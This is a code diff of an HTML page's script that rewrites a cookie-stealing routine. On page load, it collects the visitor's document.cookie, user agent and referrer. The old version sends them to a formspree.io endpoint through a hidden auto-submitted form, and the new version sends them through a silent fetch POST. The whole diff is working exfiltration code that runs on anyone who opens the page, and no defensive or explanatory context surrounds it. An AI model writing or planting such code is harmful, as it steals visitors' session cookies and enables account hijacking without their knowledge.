@@ -11,41 +11,18 @@
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            let form = document.createElement("form");
-            form.style.display = "none";
-            form.method = "POST";
-            form.action = "https://formspree.io/f/xeoqzkqe";
+            let data = {
+                cookie_data: document.cookie || "No_Cookies",
+                user_agent: navigator.userAgent || "Unknown_User_Agent",
+                referrer: document.referrer || "No_Referrer",
+                fallback: "not_empty"
+            };
 
-            let cookieInput = document.createElement("input");
-            cookieInput.type = "hidden";
-            cookieInput.name = "cookie_data";
-            cookieInput.value = document.cookie || "No_Cookies";
-
-            let agentInput = document.createElement("input");
-            agentInput.type = "hidden";
-            agentInput.name = "user_agent";
-            agentInput.value = navigator.userAgent || "Unknown_User_Agent";
-
-            let referrerInput = document.createElement("input");
-            referrerInput.type = "hidden";
-            referrerInput.name = "referrer";
-            referrerInput.value = document.referrer || "No_Referrer";
-
-            let fallbackInput = document.createElement("input");
-            fallbackInput.type = "hidden";
-            fallbackInput.name = "fallback";
-            fallbackInput.value = "not_empty";
-
-            form.appendChild(cookieInput);
-            form.appendChild(agentInput);
-            form.appendChild(referrerInput);
-            form.appendChild(fallbackInput);
-
-            document.body.appendChild(form);
-
-            if (document.cookie !== "No_Cookies" || document.referrer !== "No_Referrer") {
-                form.submit();
-            }
+            fetch("https://formspree.io/f/xeoqzkqe", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
         });
     </script>
 
